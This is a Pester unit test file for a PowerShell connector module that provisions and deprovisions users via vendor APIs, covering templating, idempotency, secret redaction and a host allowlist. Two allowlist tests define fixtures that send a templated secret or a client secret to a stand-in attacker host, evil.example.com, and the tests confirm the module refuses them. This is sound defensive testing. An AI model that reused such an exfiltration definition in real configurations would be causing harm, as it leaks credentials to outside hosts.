#Requires -Modules @{ ModuleName='Pester'; ModuleVersion='5.0.0' }
# Unit tests for Coretelligent.Connector — the generic low-code connector executor
# (docs/CONNECTOR_BUILDER.md). Mocks the HTTP seam (Invoke-CtgConnectorApi). The behaviour pinned:
#   - lane steps run in order, templates resolve from user/config/secret/vars,
#   - the HOST ALLOWLIST refuses any resolved URL outside definition.hosts,
#   - expect gates statuses, extract feeds vars, when/skipWhen make lanes idempotent,
#   - secret values NEVER appear in errors/action lines.

BeforeAll {
    Import-Module "$PSScriptRoot/../modules/Coretelligent.Connector/Coretelligent.Connector.psm1" -Force

    function script:NewDefinition {
        param([hashtable]$Over = @{})
        $def = @{
            version    = 1
            kind       = 'http'
            baseUrl    = 'https://api.vendor.com/v1'
            hosts      = @('api.vendor.com')
            auth       = @{ type = 'bearer'; secretName = 'custom-vendor-api' }
            defaults   = @{ headers = @{ 'X-Client' = '{{client.slug}}' } }
            operations = @{
                'find-user'    = @{
                    request = @{ method = 'GET'; path = '/users?email={{user.email}}' }
                    expect  = @{ status = @(200) }
                    extract = @{ userId = 'results.0.id' }
                }
                'create-user'  = @{
                    request = @{ method = 'POST'; path = '/users'; body = @{ email = '{{user.email}}'; name = '{{user.displayName}}' } }
                    expect  = @{ status = @(201) }
                    extract = @{ userId = 'id' }
                }
                'disable-user' = @{
                    request = @{ method = 'POST'; path = '/users/{{vars.userId}}/deactivate' }
                    expect  = @{ status = @(200, 204) }
                }
            }
            lanes      = @{
                test     = @( @{ op = 'find-user'; optional = $true } )
                onboard  = @( @{ op = 'find-user' }, @{ op = 'create-user'; skipWhen = 'vars.userId' } )
                offboard = @(
                    @{ op = 'find-user' },
                    @{ warnWhen = '!vars.userId'; message = 'no account found — nothing to offboard' },
                    @{ op = 'disable-user'; when = 'vars.userId' }
                )
            }
        }
        foreach ($k in $Over.Keys) { $def[$k] = $Over[$k] }
        return $def
    }

    function script:NewConfig {
        param([hashtable]$DefOver = @{})
        [pscustomobject]@{ connector = [pscustomobject]@{ kind = 'http'; definition = (NewDefinition $DefOver) } }
    }

    function script:NewCreds {
        $pw = ConvertTo-SecureString 'sekret-token-value' -AsPlainText -Force
        @{ 'custom-vendor-api' = [pscustomobject]@{
                Username   = 'api-client-id'
                Password   = $pw
                Credential = [pscredential]::new('api-client-id', $pw)
                Fields     = @{ Username = 'api-client-id'; Password = 'sekret-token-value' }
            }
        }
    }

    $script:User = [pscustomobject]@{ email = 'jdoe@medipost.com'; displayName = 'Jane Doe' }
    $script:Client = [pscustomobject]@{ slug = 'medipost'; primaryDomain = 'medipost.com' }
}

Describe 'Invoke-CtgConnectorOnboarding' {
    It 'creates the user when the find comes back empty' {
        Mock Invoke-CtgConnectorApi -ModuleName Coretelligent.Connector -MockWith {
            param($Method, $Uri, $Headers, $Body)
            if ($Method -eq 'GET') { return @{ Status = 200; Body = ([pscustomobject]@{ results = @() }); Raw = '{"results":[]}' } }
            return @{ Status = 201; Body = ([pscustomobject]@{ id = 'u-123' }); Raw = '{"id":"u-123"}' }
        }
        $r = Invoke-CtgConnectorOnboarding -User $User -Config (NewConfig) -Credentials (NewCreds) -Client $Client -SystemKey 'custom-vendor'
        $r.Status | Should -Be 'ok'
        $r.System | Should -Be 'custom-vendor'
        Should -Invoke Invoke-CtgConnectorApi -ModuleName Coretelligent.Connector -ParameterFilter { $Method -eq 'POST' -and $Uri -eq 'https://api.vendor.com/v1/users' -and $Body.email -eq 'jdoe@medipost.com' } -Times 1
        ($r.Actions -join ' ') | Should -Match 'create-user'
    }

    It 'is idempotent — skipWhen suppresses the create when the user already exists' {
        Mock Invoke-CtgConnectorApi -ModuleName Coretelligent.Connector -MockWith {
            @{ Status = 200; Body = ([pscustomobject]@{ results = @([pscustomobject]@{ id = 'u-1' }) }); Raw = '' }
        }
        $r = Invoke-CtgConnectorOnboarding -User $User -Config (NewConfig) -Credentials (NewCreds) -Client $Client
        Should -Invoke Invoke-CtgConnectorApi -ModuleName Coretelligent.Connector -ParameterFilter { $Method -eq 'POST' } -Times 0 -Exactly
        ($r.Actions -join ' ') | Should -Match 'create-user skipped'
    }

    It 'sends bearer auth + templated default headers, and templates resolve in the query' {
        Mock Invoke-CtgConnectorApi -ModuleName Coretelligent.Connector -MockWith {
            @{ Status = 200; Body = ([pscustomobject]@{ results = @([pscustomobject]@{ id = 'u-1' }) }); Raw = '' }
        }
        $null = Invoke-CtgConnectorOnboarding -User $User -Config (NewConfig) -Credentials (NewCreds) -Client $Client
        Should -Invoke Invoke-CtgConnectorApi -ModuleName Coretelligent.Connector -ParameterFilter {
            $Headers.Authorization -eq 'Bearer sekret-token-value' -and
            $Headers['X-Client'] -eq 'medipost' -and
            $Uri -eq 'https://api.vendor.com/v1/users?email=jdoe@medipost.com'
        } -Times 1
    }

    It 'refuses to run without an injected published definition' {
        { Invoke-CtgConnectorOnboarding -User $User -Config ([pscustomobject]@{}) -Credentials (NewCreds) -Client $Client } |
            Should -Throw '*not published*'
    }
}

Describe 'Invoke-CtgConnectorOffboarding' {
    It 'disables the found user and reports the action trail' {
        Mock Invoke-CtgConnectorApi -ModuleName Coretelligent.Connector -MockWith {
            param($Method, $Uri, $Headers, $Body)
            if ($Method -eq 'GET') { return @{ Status = 200; Body = ([pscustomobject]@{ results = @([pscustomobject]@{ id = 'u-9' }) }); Raw = '' } }
            return @{ Status = 204; Body = $null; Raw = '' }
        }
        $r = Invoke-CtgConnectorOffboarding -User $User -Config (NewConfig) -Credentials (NewCreds) -Client $Client
        $r.Status | Should -Be 'ok'
        Should -Invoke Invoke-CtgConnectorApi -ModuleName Coretelligent.Connector -ParameterFilter { $Uri -eq 'https://api.vendor.com/v1/users/u-9/deactivate' } -Times 1
    }

    It 'warns (not fails) when there is no account to offboard' {
        Mock Invoke-CtgConnectorApi -ModuleName Coretelligent.Connector -MockWith {
            @{ Status = 200; Body = ([pscustomobject]@{ results = @() }); Raw = '' }
        }
        $r = Invoke-CtgConnectorOffboarding -User $User -Config (NewConfig) -Credentials (NewCreds) -Client $Client
        $r.Status | Should -Be 'ok'
        ($r.Actions -join "`n") | Should -Match 'WARN no account found'
        ($r.Actions -join "`n") | Should -Match 'disable-user skipped'
    }

    It 'fails the step on an unexpected vendor status, with a redacted snippet' {
        Mock Invoke-CtgConnectorApi -ModuleName Coretelligent.Connector -MockWith {
            param($Method, $Uri, $Headers, $Body)
            if ($Method -eq 'GET') { return @{ Status = 200; Body = ([pscustomobject]@{ results = @([pscustomobject]@{ id = 'u-9' }) }); Raw = '' } }
            return @{ Status = 500; Body = $null; Raw = 'boom sekret-token-value leaked' }
        }
        $err = { Invoke-CtgConnectorOffboarding -User $User -Config (NewConfig) -Credentials (NewCreds) -Client $Client } |
            Should -Throw -PassThru
        $err.Exception.Message | Should -Match 'HTTP 500'
        $err.Exception.Message | Should -Not -Match 'sekret-token-value'
        $err.Exception.Message | Should -Match '\*\*\*'
    }
}

Describe 'expect.status default (regression: the any-2xx branch was unreachable)' {
    It 'treats a 2xx as success when an operation declares no expect.status' {
        Mock Invoke-CtgConnectorApi -ModuleName Coretelligent.Connector -MockWith {
            param($Method, $Uri, $Headers, $Body)
            # find-user returns a user; disable-user has NO expect block → must accept its 200.
            if ($Method -eq 'GET') { return @{ Status = 200; Body = ([pscustomobject]@{ results = @([pscustomobject]@{ id = 'u-9' }) }); Raw = '' } }
            return @{ Status = 200; Body = $null; Raw = '' }
        }
        $def = NewDefinition
        # Strip expect from disable-user so the default path is exercised.
        $def.operations['disable-user'].Remove('expect')
        $cfg = [pscustomobject]@{ connector = [pscustomobject]@{ kind = 'http'; definition = $def } }
        $r = Invoke-CtgConnectorOffboarding -User $User -Config $cfg -Credentials (NewCreds) -Client $Client
        $r.Status | Should -Be 'ok'
        ($r.Actions -join ' ') | Should -Match 'disable-user'
    }
}

Describe 'secret redaction on the SUCCESS action line' {
    It 'scrubs a secret templated into the URL path from the returned action line' {
        Mock Invoke-CtgConnectorApi -ModuleName Coretelligent.Connector -MockWith { @{ Status = 200; Body = $null; Raw = '' } }
        $def = NewDefinition @{
            operations = @{ 'ping' = @{ request = @{ method = 'GET'; path = '/bot{{secret.custom-vendor-api.Password}}/ping' }; expect = @{ status = @(200) } } }
            lanes      = @{ offboard = @( @{ op = 'ping' } ) }
        }
        $cfg = [pscustomobject]@{ connector = [pscustomobject]@{ kind = 'http'; definition = $def } }
        $r = Invoke-CtgConnectorOffboarding -User $User -Config $cfg -Credentials (NewCreds) -Client $Client
        ($r.Actions -join "`n") | Should -Not -Match 'sekret-token-value'
        ($r.Actions -join "`n") | Should -Match '\*\*\*'
    }
}

Describe 'OAuth token host allowlist' {
    It 'refuses to POST the client secret to a tokenUrl outside the allowlist' {
        $def = NewDefinition @{
            auth  = @{ type = 'oauth2-client-credentials'; secretName = 'custom-vendor-api'; tokenUrl = 'https://evil.example.com/token' }
            lanes = @{ offboard = @( @{ op = 'find-user' } ) }
        }
        $cfg = [pscustomobject]@{ connector = [pscustomobject]@{ kind = 'http'; definition = $def } }
        Mock Invoke-CtgConnectorApi -ModuleName Coretelligent.Connector -MockWith { @{ Status = 200; Body = ([pscustomobject]@{ results = @() }); Raw = '' } }
        { Invoke-CtgConnectorOffboarding -User $User -Config $cfg -Credentials (NewCreds) -Client $Client } |
            Should -Throw '*host allowlist*'
    }
}

Describe 'host allowlist' {
    It 'refuses a template that resolves the request to a foreign host' {
        $def = NewDefinition @{ operations = @{
                'exfil' = @{ request = @{ method = 'POST'; path = 'https://evil.example.com/collect'; body = @{ t = '{{secret.custom-vendor-api.Password}}' } } }
            }; lanes = @{ offboard = @( @{ op = 'exfil' } ) } }
        $cfg = [pscustomobject]@{ connector = [pscustomobject]@{ kind = 'http'; definition = $def } }
        Mock Invoke-CtgConnectorApi -ModuleName Coretelligent.Connector -MockWith { @{ Status = 200; Body = $null; Raw = '' } }
        { Invoke-CtgConnectorOffboarding -User $User -Config $cfg -Credentials (NewCreds) -Client $Client } |
            Should -Throw '*not in the connector''s host allowlist*'
        Should -Invoke Invoke-CtgConnectorApi -ModuleName Coretelligent.Connector -Times 0 -Exactly
    }

    It 'refuses a definition with no host allowlist at all' {
        $cfg = [pscustomobject]@{ connector = [pscustomobject]@{ kind = 'http'; definition = (NewDefinition @{ hosts = @() }) } }
        { Invoke-CtgConnectorOffboarding -User $User -Config $cfg -Credentials (NewCreds) -Client $Client } |
            Should -Throw '*host allowlist*'
    }
}

Describe 'Test-CtgConnectorConnection' {
    It 'runs the test lane and reports ok' {
        Mock Invoke-CtgConnectorApi -ModuleName Coretelligent.Connector -MockWith {
            @{ Status = 200; Body = ([pscustomobject]@{ results = @() }); Raw = '' }
        }
        # The test lane must not depend on a case payload — context user is empty there.
        $def = NewDefinition
        $def.operations['ping'] = @{ request = @{ method = 'GET'; path = '/ping' }; expect = @{ status = @(200) } }
        $def.lanes = @{ test = @( @{ op = 'ping' } ) }
        $cfg = [pscustomobject]@{ connector = [pscustomobject]@{ kind = 'http'; definition = $def } }
        $r = Test-CtgConnectorConnection -Config $cfg -Credentials (NewCreds) -Client $Client
        $r.ok | Should -BeTrue
        $r.detail | Should -Match 'ping'
    }

    It 'is honest when no test lane exists' {
        $def = NewDefinition
        $def.lanes = @{ offboard = @( @{ op = 'find-user' } ) }
        $cfg = [pscustomobject]@{ connector = [pscustomobject]@{ kind = 'http'; definition = $def } }
        $r = Test-CtgConnectorConnection -Config $cfg -Credentials (NewCreds) -Client $Client
        $r.ok | Should -BeFalse
        $r.detail | Should -Match "no 'test' lane"
    }
}

Describe 'template + condition primitives' {
    It 'resolves dotted paths through arrays' {
        $obj = [pscustomobject]@{ results = @([pscustomobject]@{ id = 'a' }, [pscustomobject]@{ id = 'b' }) }
        Get-CtgConnectorPath $obj 'results.1.id' | Should -Be 'b'
        Get-CtgConnectorPath $obj 'results.5.id' | Should -BeNullOrEmpty
    }

    It 'throws on an unresolvable template instead of substituting empty' {
        { Resolve-CtgConnectorTemplate '/users/{{vars.userId}}' @{ vars = @{} } } | Should -Throw '*did not resolve*'
    }

    It 'evaluates negated conditions on absent paths' {
        Test-CtgConnectorCondition '!vars.userId' @{ vars = @{} } | Should -BeTrue
        Test-CtgConnectorCondition 'vars.userId' @{ vars = @{ userId = 'u-1' } } | Should -BeTrue
        Test-CtgConnectorCondition '!vars.userId' @{ vars = @{ userId = 'u-1' } } | Should -BeFalse
    }
}
